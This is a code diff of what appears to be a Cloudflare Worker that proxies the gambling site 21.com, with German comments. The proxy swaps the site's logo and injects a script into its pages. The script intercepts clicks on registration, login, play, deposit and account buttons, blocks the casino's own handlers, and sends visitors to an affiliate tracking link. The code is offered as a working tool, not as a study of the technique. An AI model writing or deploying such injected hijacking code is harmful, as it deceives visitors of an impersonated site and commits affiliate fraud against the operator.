@@ -1,11 +1,9 @@
 export default {
   async fetch(request) {
     const targetBase = "https://www.21.com";
-    
-    // Dein genauer Affiliate-Tracking-Link
     const affiliateUrl = "https://prod.trk21.com/click?offer=FF5GG2YAJ0P0&uid=CVuo3XCJ";
     
-    // Trage hier die Bild-URL deines neuen Logos ein:
+    // ACHTUNG: Hier wieder deinen Logo-Link eintragen!
     const newLogoUrl = "https://images.law.com/brightspot/07/9a/9f50cbdc4a4eaa523a73b70a4814/flank-logo-1-767x633.jpg";
 
     const url = new URL(request.url);
@@ -28,39 +26,33 @@ export default {
           element(el) {
             el.append(`
               <style>
-                /* Zwingt den Browser dauerhaft, dein Logo zu zeigen (übersteuert React/Hydration) */
+                /* Logo dauerhaft überschreiben */
                 img[src*="logo"], img[alt*="21.com"], img[aria-label*="21.com"] {
                   content: url("${newLogoUrl}") !important;
                 }
               </style>
               <script>
-                document.addEventListener("DOMContentLoaded", function() {
-                  const affLink = "${affiliateUrl}";
+                const affLink = "${affiliateUrl}";
+                
+                // Fängt Klicks aggressiv auf der höchsten Browser-Ebene ab (Capture Phase)
+                window.addEventListener("click", function(e) {
+                  const target = e.target.closest("a, button, [role='button']");
+                  if (!target) return;
+                  
+                  const text = (target.textContent || "").toLowerCase();
+                  const href = (target.getAttribute("href") || "").toLowerCase();
 
-                  // Fängt alle Klicks auf Registrierungs- & CTA-Buttons ab
-                  document.addEventListener("click", function(e) {
-                    const target = e.target.closest("a, button");
-                    if (!target) return;
-
-                    const href = (target.getAttribute("href") || "").toLowerCase();
-                    const text = (target.innerText || "").toLowerCase();
-
-                    // Wenn auf Anmelden, Registrieren oder Spielen geklickt wird
-                    if (
-                      href.includes("register") ||
-                      href.includes("signup") ||
-                      href.includes("join") ||
-                      text.includes("registrier") ||
-                      text.includes("anmelden") ||
-                      text.includes("jetzt spielen") ||
-                      text.includes("konto")
-                    ) {
-                      e.preventDefault();
-                      e.stopPropagation();
-                      window.location.href = affLink;
-                    }
-                  }, true);
-                });
+                  // Prüfen, ob der Klick mit Anmeldung, Registrierung oder Spielen zu tun hat
+                  if (
+                    href.includes("register") || href.includes("login") || href.includes("signup") ||
+                    text.includes("registrier") || text.includes("anmelden") || text.includes("login") ||
+                    text.includes("spielen") || text.includes("einzahlen") || text.includes("konto")
+                  ) {
+                    e.preventDefault(); // Verhindert das Öffnen des Login-Popups
+                    e.stopPropagation(); // Blockiert das Casino-Skript
+                    window.location.href = affLink; // Sofortige Weiterleitung zum Tracker
+                  }
+                }, true); // <- Dieses 'true' ist der Gamechanger!
               </script>
             `, { html: true });
           }
